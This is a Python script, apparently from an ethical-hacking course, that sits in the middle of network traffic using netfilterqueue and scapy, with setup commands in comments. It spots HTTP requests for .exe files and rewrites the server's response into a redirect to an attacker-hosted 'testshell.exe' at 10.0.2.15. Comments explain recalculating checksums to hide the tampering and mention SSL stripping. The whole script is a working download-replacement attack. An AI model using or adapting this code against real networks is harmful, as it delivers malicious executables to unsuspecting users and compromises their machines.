#!/usr/bin/env python

#1. apt-get install build-essential python-dev libnetfilter-queue-dev
#2. apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
#3. pip3 install NFQP3 --> install netfilterqueue
# change ip tables to set up queue --> iptables -I FORWARD -j NFQUEUE --queue-num 0 (use OUTPUT instead of FORWARD for local machine)
# http://www.diabeticretinopathy.org.uk/exeforlaptops.html
# check for more exentsions than just exe


import netfilterqueue
import scapy.all as scapy
# check load request for kali, windows, mac etc
# we need to catch the syn/ack to make sure its the right request and reposne
ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    
    return packet

# filter traffic based on port (80, 443 if we can figure out SSL stripping)
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # we don't want DNSRR any more we're going after HTTP data
    # we want responses not requests because we are replacing downloads (sport and dport) 
    # check the load field for executables and ELFs
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
    # if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            # print("HTTP Request")
            # make list downloadable extensions
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                # capture the ack
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000:
            # print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+} Replacing File")
                # print(scapy_packet.show())
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/testshell.exe\n\n\n")
                # same as dns spoofer we need to delete these fields and scapy will redo them for us to hide the fact they have been altered

                packet.set_payload(str(modified_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
